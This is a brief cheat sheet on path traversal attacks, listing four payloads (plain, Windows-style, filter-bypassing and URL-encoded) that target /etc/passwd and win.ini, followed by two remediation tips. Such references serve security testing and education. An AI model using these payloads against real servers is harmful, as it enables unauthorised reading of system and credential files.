# Path Traversal

## Summary
Read arbitrary files via directory traversal.

## Payloads

```
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

## Remediation
- Use whitelist of allowed files
- Canonicalize and validate paths
